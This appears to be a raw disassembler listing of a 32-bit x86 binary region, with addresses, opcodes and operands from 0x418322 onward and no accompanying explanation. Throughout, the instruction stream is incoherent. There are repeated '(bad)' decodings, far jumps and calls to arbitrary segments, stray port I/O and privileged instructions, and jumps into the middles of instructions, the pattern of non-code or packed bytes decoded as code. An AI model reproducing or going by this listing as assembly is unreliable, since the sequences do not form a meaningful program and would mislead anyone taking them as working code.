  418322:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418323:	call   0x760be7c6
  418328:	jg     0x4183a6
  41832a:	jmp    0xdedd:0x431f8736
  418331:	xor    dl,BYTE PTR [edx-0x6553201b]
  418337:	jo     0x418305
  418339:	rcl    dl,cl
  41833b:	pop    DWORD PTR [esi-0x56]
  41833e:	dec    edx
  41833f:	lahf   
  418340:	and    dl,ah
  418342:	jge    0x4183ae
  418344:	jl     0x4182d0
  418346:	pop    edi
  418347:	test   al,dl
  418349:	aas    
  41834a:	adc    DWORD PTR [esi+0x52],edx
  41834d:	stos   DWORD PTR es:[edi],eax
  41834e:	push   esi
  41834f:	stos   BYTE PTR es:[edi],al
  418350:	dec    esi
  418351:	jbe    0x41836f
  418353:	mov    eax,ds:0x3b36f363
  418358:	dec    esp
  418359:	sar    DWORD PTR [edx-0x7],cl
  41835c:	enter  0x7d00,0x73
  418360:	mov    WORD PTR [eax-0x56],cs
  418363:	je     0x4182fb
  418365:	test   eax,0xa361683d
  41836a:	xlat   BYTE PTR ds:[ebx]
  41836b:	fld    TBYTE PTR [ecx-0x299801bd]
  418371:	into   
  418372:	inc    ebx
  418373:	jne    0x418301
  418375:	mov    bh,0x94
  418377:	jbe    0x418393
  418379:	push   ecx
  41837a:	adc    al,0x9b
  41837c:	add    al,0x8a
  41837e:	xchg   edx,ecx
  418380:	and    eax,0x6e4bf697
  418385:	mov    ebx,ebp
  418387:	sbb    BYTE PTR [eax-0x73241721],ch
  41838d:	test   al,0xec
  41838f:	jbe    0x4183d1
  418391:	fnstsw WORD PTR [ecx-0x33844bca]
  418397:	pop    esi
  418398:	leave  
  418399:	mov    bl,0xb9
  41839b:	stos   DWORD PTR es:[edi],eax
  41839c:	push   edx
  41839d:	inc    ebx
  41839e:	fist   WORD PTR [esi+0x1b]
  4183a1:	and    al,0xb9
  4183a3:	inc    edx
  4183a4:	cmp    ebp,DWORD PTR ds:0xbf03f049
  4183aa:	cmp    eax,0x744520fb
  4183af:	ins    BYTE PTR es:[edi],dx
  4183b0:	jmp    0x4ba:0x3493d7f4
  4183b7:	push   edx
  4183b8:	(bad)  
  4183b9:	(bad)  gs:[esi-0x3f99277c]
  4183c0:	add    al,BYTE PTR [ebp+0x7c]
  4183c3:	test   al,0x1e
  4183c5:	adc    BYTE PTR [ecx+0x131ad600],0x45
  4183cc:	adc    ebp,edx
  4183ce:	xchg   ebp,eax
  4183cf:	push   esp
  4183d0:	nop
  4183d1:	cmc    
  4183d2:	das    
  4183d3:	outs   dx,DWORD PTR ds:[esi]
  4183d4:	mov    bh,0x8f
  4183d6:	jo     0x418370
  4183d8:	int    0x5b
  4183da:	or     esp,DWORD PTR [edi+edx*4-0x5f]
  4183de:	and    DWORD PTR [eax],ebp
  4183e0:	mov    ds:0x40fd791f,eax
  4183e5:	rcl    DWORD PTR [edx+0x4c8d1aed],cl
  4183eb:	mov    ah,0xf
  4183ed:	xchg   di,ax
  4183ef:	cmp    eax,0x98a8c585
  4183f4:	pop    ebx
  4183f5:	jno    0x9a3b503e
  4183fb:	mov    ebp,0x2d610081
  418400:	xor    eax,0xbd212d97
  418405:	icebp  
  418406:	shl    DWORD PTR [ecx+0x68254046],cl
  41840c:	mov    ds:0x39a7bd31,eax
  418411:	and    DWORD PTR [edx],esi
  418413:	popa   
  418414:	test   al,0x4c
  418416:	mov    ecx,0xafde3f86
  41841b:	stc    
  41841c:	sub    BYTE PTR [eax-0x19],0xb5
  418420:	cs xchg ebp,eax
  418422:	cmp    DWORD PTR [eax-0x4b],eax
  418425:	adc    BYTE PTR [esi+0x7a986775],0x6
  41842c:	outs   dx,DWORD PTR ds:[esi]
  41842d:	std    
  41842e:	cli    
  41842f:	push   esp
  418430:	rol    esp,1
  418432:	stc    
  418433:	sub    al,0xac
  418435:	xor    eax,0xbd7fec2b
  41843a:	mov    eax,DWORD PTR [edi+0x26]
  41843d:	aas    
  41843e:	std    
  41843f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418440:	pop    esp
  418441:	mov    BYTE PTR fs:[ebp+edi*2+0x2],al
  418446:	in     eax,0x99
  418448:	fcom   QWORD PTR [esi]
  41844a:	scas   al,BYTE PTR es:[edi]
  41844b:	jge    0x41846a
  41844d:	stos   DWORD PTR es:[edi],eax
  41844e:	add    eax,0x8313fe83
  418453:	xor    ch,al
  418455:	in     al,0x6f
  418457:	(bad)  
  418458:	out    0xf2,al
  41845a:	repz mov edi,esp
  41845d:	mov    eax,0x46d5ece8
  418462:	push   edi
  418463:	frstor [esi+eax*2+0x47f7b97d]
  41846a:	sub    al,0xf4
  41846c:	or     eax,0x936ed19a
  418471:	stos   DWORD PTR es:[edi],eax
  418472:	add    eax,0xb94ae207
  418477:	jnp    0x4184d2
  418479:	scas   eax,DWORD PTR es:[edi]
  41847a:	mov    DWORD PTR [edx-0x3f],ebx
  41847d:	sub    ch,bh
  41847f:	dec    ebp
  418480:	jmp    0xf929:0xee6407a3
  418487:	or     esi,ebp
  418489:	dec    eax
  41848a:	enter  0xb067,0x94
  41848e:	ins    DWORD PTR es:[edi],dx
  41848f:	pop    ecx
  418490:	sbb    eax,0x87fcb10e
  418495:	(bad)  
  418496:	push   ds
  418497:	repnz div BYTE PTR [eax+0x3ec5461f]
  41849e:	mov    BYTE PTR ds:0x7cdc6770,cl
  4184a4:	adc    al,0x51
  4184a6:	xor    BYTE PTR [ebx],bh
  4184a8:	or     ebp,DWORD PTR [eax+0x7a]
  4184ab:	pop    esi
  4184ac:	adc    al,0x79
  4184ae:	popa   
  4184af:	(bad)
  4184b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184b3:	inc    ebx
  4184b4:	into   
  4184b5:	sbb    DWORD PTR ds:0xabd4e7e9,ecx
  4184bb:	std    
  4184bc:	stos   DWORD PTR es:[edi],eax
  4184bd:	sbb    DWORD PTR [edi],ebp
  4184bf:	or     al,0xac
  4184c1:	jo     0x4184ea
  4184c3:	push   0xfffffff3
  4184c5:	or     bh,BYTE PTR [ebx-0x6]
  4184c8:	or     cl,BYTE PTR [ecx-0x6e]
  4184cb:	xchg   BYTE PTR [eax],cl
  4184cd:	jne    0x418479
  4184cf:	xchg   ebp,eax
  4184d0:	lahf   
  4184d1:	scas   eax,DWORD PTR es:[edi]
  4184d2:	mov    ah,0x72
  4184d4:	loope  0x418479
  4184d6:	mov    bl,0xcc
  4184d8:	out    dx,al
  4184d9:	aaa    
  4184da:	cmp    dl,BYTE PTR [eax]
  4184dc:	call   0xd9012ed8
  4184e1:	std    
  4184e2:	and    ebp,eax
  4184e4:	aad    0xed
  4184e6:	das    
  4184e7:	sub    DWORD PTR [esi-0x7645bb8b],esi
  4184ed:	in     eax,0x29
  4184ef:	mov    gs,eax
  4184f1:	sub    eax,0x95e890a0
  4184f6:	add    cl,al
  4184f8:	out    0xd4,eax
  4184fa:	sub    ch,al
  4184fc:	ins    BYTE PTR es:[edi],dx
  4184fd:	ds mov dh,0x90
  418500:	loop   0x4184d4
  418502:	shl    bh,0x1d
  418505:	outs   dx,BYTE PTR ds:[esi]
  418506:	fisttp DWORD PTR [ebx]
  418508:	mov    ?,WORD PTR [eax+0x12]
  41850b:	xchg   esp,eax
  41850c:	lahf   
  41850d:	jbe    0x418493
  41850f:	js     0x41858d
  418511:	stos   BYTE PTR es:[edi],al
  418512:	test   eax,0x51b9c446
  418517:	pop    esi
  418518:	mov    ecx,0xf3311927
  41851d:	xlat   BYTE PTR ds:[ebx]
  41851e:	dec    ebp
  41851f:	fs adc ch,dl
  418522:	arpl   WORD PTR ds:0x1cd38e75,si
  418528:	jmp    0x63fb10d4
  41852d:	(bad)  
  41852e:	sbb    dh,0x6c
  418531:	sub    eax,0x1513967a
  418536:	or     BYTE PTR [eax+0x2f],ch
  418539:	loop   0x418539
  41853b:	je     0x4185b3
  41853d:	and    eax,0x32866314
  418542:	mov    ?,WORD PTR [ecx]
  418544:	repnz cwde 
  418546:	and    ecx,ebx
  418548:	imul   esp,DWORD PTR [eax-0x3465fff2],0x7575c2e4
  418552:	xor    eax,0x583356a
  418557:	ret    
  418558:	xchg   ecx,eax
  418559:	ins    WORD PTR es:[edi],dx
  41855b:	jb     0x418572
  41855d:	shr    DWORD PTR [ebp-0x50],0x92
  418561:	std    
  418562:	jns    0x4184e4
  418564:	out    0x4d,al
  418566:	bound  edx,QWORD PTR [edx+0x2480cde8]
  41856c:	add    al,0xab
  41856e:	cmp    esi,DWORD PTR [edi+esi*8-0x3d]
  418572:	cld    
  418573:	pop    edx
  418574:	sub    BYTE PTR [eax],ah
  418576:	inc    eax
  418577:	js     0x418547
  418579:	daa    
  41857a:	aas    
  41857b:	mov    ds,WORD PTR [edi]
  41857d:	add    BYTE PTR [esi],al
  41857f:	inc    edx
  418580:	in     eax,dx
  418581:	adc    eax,0x9c23e2ff
  418586:	inc    DWORD PTR [edx+0x0]
  418589:	xlat   BYTE PTR ds:[ebx]
  41858a:	xchg   ecx,eax
  41858b:	js     0x41857d
  41858d:	and    BYTE PTR [ebp+0x58f839c2],dl
  418593:	or     DWORD PTR [ecx],esp
  418595:	or     bh,BYTE PTR [ecx-0x4c]
  418598:	sbb    edx,DWORD PTR [esi-0x19491022]
  41859e:	mov    DWORD PTR [edi-0x206088e],ecx
  4185a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185a5:	jns    0x418596
  4185a7:	ja     0x41857e
  4185a9:	jl     0x418613
  4185ab:	mov    ch,ch
  4185ad:	fisub  WORD PTR [eax]
  4185af:	stc    
  4185b0:	ja     0x4185aa
  4185b2:	inc    BYTE PTR ds:0x23e07983
  4185b8:	fbstp  TBYTE PTR [ebp+0x1c2c0d54]
  4185be:	xchg   edx,eax
  4185bf:	lods   al,BYTE PTR ds:[esi]
  4185c0:	mov    edi,0x24116932
  4185c5:	in     al,0xcd
  4185c7:	push   0x3f
  4185c9:	jp     0x4185c7
  4185cb:	adc    al,0x80
  4185cd:	fmulp  st(4),st
  4185cf:	lods   al,BYTE PTR ds:[esi]
  4185d0:	call   0xaaa9:0x1d9d74b5
  4185d7:	aam    0xea
  4185d9:	in     eax,0xbb
  4185db:	mov    edx,0x81576c49
  4185e0:	adc    eax,0x3afb670a
  4185e5:	cmp    esi,esi
  4185e7:	jbe    0x418620
  4185e9:	jge    0x418602
  4185eb:	cli    
  4185ec:	xchg   esi,eax
  4185ed:	icebp  
  4185ee:	aas    
  4185ef:	dec    edx
  4185f0:	pop    edi
  4185f1:	sub    DWORD PTR [esi+0x43],0x7d
  4185f5:	inc    ebx
  4185f6:	aam    0x4e
  4185f8:	push   edi
  4185f9:	mov    BYTE PTR [ecx+eax*1],dl
  4185fc:	int3   
  4185fd:	mov    bh,0x45
  4185ff:	push   edx
  418600:	sbb    BYTE PTR [eax-0x69],bh
  418603:	lods   al,BYTE PTR ds:[esi]
  418604:	repnz addr16 pushf 
  418607:	aas    
  418608:	sar    DWORD PTR [ebx],0x6d
  41860b:	cdq    
  41860c:	adc    BYTE PTR [ecx-0x4afa6e9f],bl
  418612:	pop    es
  418613:	stos   DWORD PTR es:[edi],eax
  418614:	push   ss
  418615:	fs dec eax
  418617:	mov    ecx,0x9c976a41
  41861c:	repnz mov edi,DWORD PTR [esi+edx*8]
  418620:	sub    DWORD PTR [edi-0x616870c7],edx
  418626:	xchg   ebx,eax
  418627:	pop    ebx
  418628:	pop    ss
  418629:	inc    ebp
  41862a:	int3   
  41862b:	xchg   esi,eax
  41862c:	cmp    BYTE PTR [esp+ecx*8],dl
  41862f:	clc    
  418630:	push   ss
  418631:	fcom   QWORD PTR [ecx+0x3209a491]
  418637:	or     eax,0xa179b464
  41863c:	es pusha 
  41863e:	ficomp WORD PTR [esi-0x5e]
  418641:	jno    0x418618
  418643:	pop    eax
  418644:	popf   
  418645:	shl    DWORD PTR [ebp+0x18],0xf
  418649:	dec    ebp
  41864a:	xchg   ebp,eax
  41864b:	mov    ebp,0x5549d3d2
  418650:	fbld   TBYTE PTR [edx-0x2e]
  418653:	nop
  418654:	adc    cl,BYTE PTR [edi*4+0x424d5937]
  41865b:	shr    BYTE PTR [edi-0x72],1
  41865e:	jae    0x4186c5
  418660:	jbe    0x4186ce
  418662:	mov    al,ds:0xcccb7725
  418667:	and    al,0x9a
  418669:	sub    eax,0x638212fc
  41866e:	push   esp
  41866f:	mov    BYTE PTR ds:0x12dff643,dh
  418675:	and    BYTE PTR [edi],cl
  418677:	or     eax,0x668c1e63
  41867c:	dec    edi
  41867d:	push   ds
  41867e:	mov    DWORD PTR [edx-0x531e3cab],ebx
  418684:	lock sbb ah,BYTE PTR [edx]
  418687:	jnp    0x418678
  418689:	sub    dh,BYTE PTR gs:[ebx-0x69b24491]
  418690:	jo     0x41862d
  418692:	sbb    eax,0x2672faa6
  418697:	add    BYTE PTR [ebp+0x7f5e9044],ch
  41869d:	int    0x60
  41869f:	adc    eax,0xc2df46a8
  4186a4:	mov    cl,BYTE PTR [ebx-0x63]
  4186a7:	adc    al,0xdf
  4186a9:	adc    BYTE PTR [edx+0x4d8063f4],ch
  4186af:	aam    0x44
  4186b1:	inc    eax
  4186b2:	stos   DWORD PTR es:[edi],eax
  4186b3:	outs   dx,BYTE PTR ds:[esi]
  4186b4:	daa    
  4186b5:	test   al,0xe4
  4186b7:	pop    ebp
  4186b8:	and    esi,DWORD PTR [ebx+0x3a]
  4186bb:	loopne 0x41865c
  4186bd:	ret    
  4186be:	aas    
  4186bf:	jle    0x4186a7
  4186c1:	inc    edx
  4186c2:	dec    ebx
  4186c3:	cmp    eax,0xdbd29772
  4186c8:	ins    BYTE PTR es:[edi],dx
  4186c9:	cs ror esi,cl
  4186cc:	or     al,0x88
  4186ce:	(bad)  
  4186d0:	push   DWORD PTR [edx+0x2d]
  4186d3:	inc    edx
  4186d4:	mov    ebp,DWORD PTR [ecx]
  4186d6:	mov    esi,0x96900b66
  4186db:	sahf   
  4186dc:	mov    cl,0x48
  4186de:	mov    ah,0xaf
  4186e0:	sti    
  4186e1:	jl     0x41866a
  4186e3:	xor    al,0xed
  4186e5:	enter  0x6794,0xf0
  4186e9:	xchg   esi,eax
  4186ea:	in     eax,dx
  4186eb:	xchg   ebp,eax
  4186ec:	lds    ebp,FWORD PTR [ecx]
  4186ee:	cs push eax
  4186f0:	push   0xf
  4186f2:	loope  0x4186a3
  4186f4:	adc    DWORD PTR [ebp-0x4251d5b0],eax
  4186fa:	pop    ds
  4186fb:	mov    ch,0x34
  4186fd:	ins    BYTE PTR es:[edi],dx
  4186fe:	dec    esi
  4186ff:	iret   
  418700:	sbb    al,0xf7
  418702:	inc    ecx
  418703:	xor    ah,BYTE PTR [ecx]
  418705:	jmp    0x68fa:0x642b0c9a
  41870c:	cmovo  edx,DWORD PTR [esi+0x4b]
  418710:	fidiv  WORD PTR [eax+0x5]
  418713:	retf   0xa57f
  418716:	gs inc edi
  418718:	add    ah,BYTE PTR [ebp-0x45ee1479]
  41871e:	xchg   ebx,eax
  41871f:	lea    esi,[edi+0x2d]
  418722:	xchg   ebx,eax
  418723:	outs   dx,BYTE PTR ds:[esi]
  418724:	adc    cl,BYTE PTR [edi+eax*1+0x63]
  418728:	cmp    eax,0x70256008
  41872d:	call   0xbad8952f
  418732:	loope  0x4186ec
  418734:	mov    al,0x8
  418736:	cmp    al,0x9b
  418738:	lods   eax,DWORD PTR ds:[esi]
  418739:	es sub al,0x3b
  41873c:	push   ecx
  41873d:	call   0x6aaa8960
  418742:	jmp    0xc0fc:0x28cef54b
  418749:	xor    eax,0x9fb77ede
  41874e:	add    bh,ch
  418750:	push   es
  418751:	les    esp,FWORD PTR [esi-0x1ef70bfb]
  418757:	jge    0x41871b
  418759:	inc    esi
  41875a:	hlt    
  41875b:	into   
  41875c:	xor    esp,esp
  41875e:	xlat   BYTE PTR ds:[ebx]
  41875f:	mov    cs,WORD PTR [edx-0x2877877b]
  418765:	mov    esp,0x36c124ef
  41876a:	stos   DWORD PTR es:[edi],eax
  41876b:	loop   0x4187b6
  41876d:	or     al,0x6d
  41876f:	out    dx,eax
  418770:	shl    esi,cl
  418772:	mov    eax,ds:0x673cd2b1
  418777:	mov    esp,0x2673100a
  41877c:	jg     0x41871e
  41877e:	cmp    al,0x2c
  418780:	fcomp  DWORD PTR [ecx+0x13]
  418783:	loop   0x41879f
  418785:	lahf   
  418786:	push   eax
  418787:	(bad)  
  418789:	push   ecx
  41878a:	call   0xd467:0xab6e7c83
  418791:	adc    ebx,edi
  418793:	nop
  418794:	dec    edi
  418795:	pop    edx
  418796:	out    dx,eax
  418797:	mov    edx,0xcfc41a72
  41879c:	aas    
  41879d:	jge    0x4187f1
  41879f:	pusha  
  4187a0:	add    DWORD PTR [esi-0x5d],0x69
  4187a4:	cli    
  4187a5:	inc    cl
  4187a7:	lods   eax,DWORD PTR ds:[esi]
  4187a8:	jne    0x418799
  4187aa:	call   0xc04a:0xe1dffd42
  4187b1:	ja     0x418824
  4187b3:	adc    eax,0xa9f06359
  4187b8:	xor    DWORD PTR [edi-0x40],esi
  4187bb:	mov    esp,0xbe1f8376
  4187c0:	push   edx
  4187c1:	fidiv  DWORD PTR [edx+0x225ecb81]
  4187c7:	(bad)  
  4187c8:	rep ins DWORD PTR es:[edi],dx
  4187ca:	sbb    BYTE PTR [ecx],0x1e
  4187cd:	sub    esi,DWORD PTR ds:0x68d3fede
  4187d3:	xchg   esp,eax
  4187d4:	sbb    BYTE PTR [edi],ch
  4187d6:	lea    edi,[esi]
  4187d8:	pop    ebp
  4187d9:	nop
  4187da:	cli    
  4187db:	xchg   ebx,eax
  4187dc:	int3   
  4187dd:	call   0x5c54:0x1fb3235
  4187e4:	das    
  4187e5:	jne    0x4187ba
  4187e7:	and    al,0x7d
  4187e9:	(bad)  [eax+0x7ca03c35]
  4187ef:	or     bh,BYTE PTR [edx]
  4187f1:	aam    0x62
  4187f3:	imul   si,WORD PTR [ecx+0x615e8f72],0x31
  4187fb:	jmp    0x9606f68f
  418800:	xchg   edx,eax
  418801:	popa   
  418802:	and    BYTE PTR [ecx+0x22],dl
  418805:	es aas 
  418807:	fsub   st(4),st
  418809:	pop    es
  41880a:	div    BYTE PTR [edi+0x63f6246f]
  418810:	ret    0x824c
  418813:	xchg   ecx,eax
  418814:	jecxz  0x4187da
  418816:	in     al,0xce
  418818:	inc    edi
  418819:	lock iret 
  41881b:	call   0xebfa:0xfa4a770
  418822:	jns    0x418851
  418824:	mov    eax,ds:0xc10b714f
  418829:	ret    0xd215
  41882c:	(bad)  
  41882e:	lods   al,BYTE PTR ds:[esi]
  41882f:	sti    
  418830:	xchg   edi,eax
  418831:	jg     0x41881d
  418833:	popf   
  418834:	div    BYTE PTR [esi]
  418836:	mul    DWORD PTR [ebp-0x5833c0e3]
  41883c:	mov    ds:0xa97e4d24,al
  418841:	call   0x29be:0xd80627a1
  418848:	mov    eax,0x176faf60
  41884d:	pop    esi
  41884e:	mov    dl,BYTE PTR [esi]
  418850:	aam    0x62
  418852:	adc    ebx,DWORD PTR [edx+0x5c]
  418855:	and    dl,BYTE PTR [ebx+0x4b]
  418858:	ins    BYTE PTR es:[edi],dx
  418859:	cmp    al,0xbe
  41885b:	bound  eax,QWORD PTR [eax]
  41885d:	sub    eax,0xfde2578
  418862:	out    0x6b,eax
  418864:	mov    ah,dl
  418866:	dec    BYTE PTR [eax+0x6e9611df]
  41886c:	jg     0x418840
  41886e:	es push ebp
  418870:	add    BYTE PTR [esi+edx*8+0x7d],al
  418874:	mov    ds:0xdbf69d2a,eax
  418879:	sbb    DWORD PTR [ecx],ebp
  41887b:	mov    al,0x4a
  41887d:	pop    ebx
  41887e:	mov    ebp,0x44ff9d3a
  418883:	pop    ebp
  418884:	dec    edi
  418885:	adc    al,0x6d
  418887:	into   
  418888:	cmc    
  418889:	data16 in al,dx
  41888b:	and    eax,0xa894f019
  418890:	addr16 dec edx
  418892:	lods   eax,DWORD PTR ds:[esi]
  418893:	test   eax,0xc1879418
  418898:	jle    0x4188e8
  41889a:	sub    dl,BYTE PTR [ebx+0x4f885860]
  4188a0:	cdq    
  4188a1:	mov    eax,0xa9739092
  4188a6:	jo     0x4188de
  4188a8:	fcom   DWORD PTR [ebp-0x1a5ff584]
  4188ae:	arpl   WORD PTR [ebx-0x58c2c1d2],ax
  4188b4:	popa   
  4188b5:	pop    es
  4188b6:	pushf  
  4188b7:	or     DWORD PTR [edi-0x8],eax
  4188ba:	cli    
  4188bb:	scas   eax,DWORD PTR es:[edi]
  4188bc:	aam    0x15
  4188be:	dec    esi
  4188bf:	fdivr  QWORD PTR [eax+0x6d]
  4188c2:	xchg   edx,eax
  4188c3:	ret    
  4188c4:	fidivr DWORD PTR [ecx+0x354964e9]
  4188ca:	lock xchg edi,eax
  4188cc:	out    dx,eax
  4188cd:	(bad)  
  4188ce:	fst    QWORD PTR [ebx]
  4188d0:	lods   al,BYTE PTR ds:[esi]
  4188d1:	sub    ebp,DWORD PTR [ebx]
  4188d3:	bound  edx,QWORD PTR [edi]
  4188d5:	repz cmp BYTE PTR [edi+0x38],0x4c
  4188da:	adc    edi,eax
  4188dc:	sahf   
  4188dd:	or     ebx,DWORD PTR [edx-0x53d7e6e]
  4188e3:	inc    edi
  4188e4:	hlt    
  4188e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188e6:	les    esi,FWORD PTR [ebp+0x10]
  4188e9:	add    BYTE PTR [eax],bl
  4188eb:	xor    edi,DWORD PTR ds:0xc6527f1b
  4188f1:	cwde   
  4188f2:	xchg   esp,eax
  4188f3:	out    dx,al
  4188f4:	fs aad 0x1
  4188f7:	(bad)  
  4188f8:	jmp    ecx
  4188fa:	jno    0x418906
  4188fc:	mov    ah,0x9e
  4188fe:	cmp    ch,BYTE PTR [edx-0x5fd8a568]
  418904:	mov    DWORD PTR [ecx-0x27af5deb],eax
  41890a:	je     0x418942
  41890c:	sbb    eax,0xa5ccdfff
  418911:	retf   
  418912:	inc    ecx
  418913:	shl    DWORD PTR [esi],cl
  418915:	ja     0x418974
  418917:	mov    bh,0xe9
  418919:	cmp    al,0x19
  41891b:	push   ds
  41891c:	or     esi,DWORD PTR [edx+ecx*4-0x2dfc2e49]
  418923:	(bad)  
  418924:	popf   
  418925:	leave  
  418926:	rcr    edi,1
  418928:	sbb    al,0x75
  41892a:	(bad)  
  41892b:	cs gs jge 0x4188c0
  41892f:	or     eax,0x17b38fba
  418934:	push   ebx
  418935:	cmp    DWORD PTR fs:[ebx-0x18f5764],eax
  41893c:	aad    0x6e
  41893e:	cmp    BYTE PTR [ebx+0x34],dh
  418941:	rcr    BYTE PTR [edx-0x23473b35],1
  418947:	adc    BYTE PTR [ebp+esi*1-0x3d],bl
  41894b:	rsqrtps xmm3,XMMWORD PTR [edx+ebp*4-0x55]
  418950:	aam    0x4f
  418952:	inc    esi
  418953:	(bad)  
  418954:	jle    0x4188e5
  418956:	xchg   edi,eax
  418957:	pop    ss
  418958:	fcmovbe st,st(4)
  41895a:	loop   0x418930
  41895c:	jno    0x418951
  41895e:	mov    edi,0x10beeaae
  418963:	retf   0x9e01
  418966:	inc    esi
  418967:	mov    edi,0x9582dddd
  41896c:	arpl   WORD PTR [edi],ax
  41896e:	mov    gs,WORD PTR [esi]
  418970:	sbb    DWORD PTR [edi-0x16ba90b1],eax
  418976:	imul   ebp,ecx,0xffffffd5
  418979:	jmp    0x418996
  41897b:	dec    esp
  41897c:	mov    bl,BYTE PTR [ebp-0x32cc8ff8]
  418982:	push   ds
  418983:	jnp    0x418914
  418985:	leave  
  418986:	icebp  
  418987:	outs   dx,BYTE PTR ds:[esi]
  418988:	sbb    eax,0xc7284c3d
  41898d:	enter  0xe760,0xe0
  418991:	fs int3 
  418993:	push   0x5d5a1f3f
  418998:	xchg   ebp,eax
  418999:	or     eax,0xbc39cb21
  41899e:	push   cs
  41899f:	push   es
  4189a0:	fcmovne st,st(5)
  4189a2:	add    edx,0x56b1c6b5
  4189a8:	ret    
  4189a9:	mov    ah,0xa4
  4189ab:	mov    edx,0xcd0396f3
  4189b0:	ret    0x5d4f
  4189b3:	hlt    
  4189b4:	ja     0x418a1c
  4189b6:	cmp    al,0xf5
  4189b8:	dec    esp
  4189b9:	test   al,0x7f
  4189bb:	jle    0x41893e
  4189bd:	inc    esi
  4189be:	sbb    ah,BYTE PTR [edi+ecx*8+0x1a]
  4189c2:	pop    ebp
  4189c3:	bound  esi,QWORD PTR [esi+eiz*8+0x75]
  4189c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189c8:	jg     0x418a48
  4189ca:	mov    esp,0x9d00a001
  4189cf:	ficom  DWORD PTR [ecx]
  4189d1:	push   ecx
  4189d2:	xchg   edi,eax
  4189d3:	sar    DWORD PTR [ebx+0x3e],0x6b
  4189d7:	jb     0x41896f
  4189d9:	adc    al,0xa7
  4189db:	aas    
  4189dc:	adc    al,0x55
  4189de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189df:	push   ds
  4189e0:	add    BYTE PTR [eax+0x374f4d7],dl
  4189e6:	mov    dh,0x47
  4189e8:	push   ds
  4189e9:	push   ds
  4189ea:	cmp    bh,BYTE PTR [eax+0xc]
  4189ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189ee:	cmp    DWORD PTR [edi+0x71df2d9f],edx
  4189f4:	ins    BYTE PTR es:[edi],dx
  4189f5:	inc    esp
  4189f6:	pop    ebp
  4189f7:	call   0xa645007f
  4189fc:	mov    BYTE PTR [ebx+0x41],al
  4189ff:	stc    
  418a00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a01:	cmc    
  418a02:	xchg   ecx,eax
  418a03:	int    0x5b
  418a05:	je     0x418994
  418a07:	imul   ebp,DWORD PTR [ebx],0x64
  418a0a:	retf   
  418a0b:	xchg   edi,eax
  418a0c:	retf   
  418a0d:	cmc    
  418a0e:	lea    ecx,[edx]
  418a10:	mov    DWORD PTR [ecx],edi
  418a12:	pop    eax
  418a13:	(bad)  
  418a14:	mov    eax,0x43740016
  418a19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a1c:	in     al,dx
  418a1d:	sbb    BYTE PTR [edi-0xc3b962d],0x38
  418a24:	repz pop ecx
  418a26:	sub    ah,BYTE PTR [edx+0x4be1af4b]
  418a2c:	(bad)  [ecx+ebp*8+0x4dd0d6d2]
  418a33:	sub    ecx,DWORD PTR [ecx+0x49]
  418a36:	dec    ebx
  418a37:	seto   BYTE PTR fs:[edi]
  418a3b:	push   esp
  418a3c:	sahf   
  418a3d:	mov    ds:0xcec05bf6,al
  418a42:	repnz cmp al,0x3a
  418a45:	xchg   DWORD PTR [esi-0x23],ebp
  418a48:	inc    esi
  418a49:	sbb    eax,0x815e3bc6
  418a4e:	hlt    
  418a4f:	pop    esi
  418a50:	leave  
  418a51:	pop    ecx
  418a52:	ror    DWORD PTR [edi],1
  418a54:	add    eax,0xbe0e5d2f
  418a59:	stos   BYTE PTR es:[edi],al
  418a5a:	inc    ebp
  418a5b:	xchg   DWORD PTR [ebx+ebx*8+0x39],edi
  418a5f:	fisttp QWORD PTR [ecx+0x1c572cfd]
  418a65:	xchg   esp,eax
  418a66:	mov    dl,0xbf
  418a68:	mov    ds:0x954912b0,eax
  418a6d:	mov    al,0x76
  418a6f:	pop    esi
  418a70:	mov    ebp,0xd25905a7
  418a75:	sbb    ebp,ecx
  418a77:	bound  ebp,QWORD PTR [ebp-0x1dae0ac6]
  418a7d:	(bad)  
  418a7f:	push   edi
  418a80:	mul    DWORD PTR [ecx]
  418a82:	retf   
  418a83:	popa   
  418a84:	ins    DWORD PTR es:[edi],dx
  418a85:	repnz push 0x4164662f
  418a8b:	lock sbb edi,DWORD PTR [ebx-0x75]
  418a8f:	(bad)  
  418a90:	scas   al,BYTE PTR es:[edi]
  418a91:	hlt    
  418a92:	inc    eax
  418a93:	sbb    ebp,eax
  418a95:	mov    ebx,0x60561d5a
  418a9a:	push   ss
  418a9b:	pop    ds
  418a9c:	pop    esp
  418a9d:	push   ebx
  418a9e:	xchg   esp,eax
  418a9f:	std    
  418aa0:	adc    al,0xfa
  418aa3:	inc    ecx
  418aa4:	jno    0x418a86
  418aa6:	pusha  
  418aa7:	data16 sbb BYTE PTR [ebp+0xd16780f],al
  418aae:	test   al,0xe1
  418ab0:	in     eax,0xc2
  418ab2:	frstor [edx+0x58017272]
  418ab8:	call   0xb2182676
  418abd:	ret    0xea0a
  418ac0:	jmp    DWORD PTR [ebx+0x76]
  418ac3:	or     eax,0x7e981b7d
  418ac8:	add    eax,0x395a72a
  418acd:	sub    DWORD PTR [esi-0x51adae57],ebx
  418ad3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ad4:	repnz lock lea ebp,[edi-0x20f89a3]
  418adc:	pop    ecx
  418add:	mov    bh,BYTE PTR [esi-0x64]
  418ae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ae1:	inc    edx
  418ae2:	das    
  418ae3:	jmp    DWORD PTR [esi]
  418ae5:	stos   DWORD PTR es:[edi],eax
  418ae6:	frstor [edx+0x24]
  418ae9:	clc    
  418aea:	enter  0x321f,0x49
  418aee:	ret    
  418aef:	adc    al,0xa
  418af1:	jae    0x418afe
  418af3:	push   ds
  418af4:	sub    al,0x7f
  418af6:	call   0x775a:0x149935e9
  418afd:	cdq    
  418afe:	mov    bl,0x98
  418b00:	pop    ebx
  418b01:	inc    eax
  418b02:	mov    cl,0xf7
  418b04:	or     al,0x3c
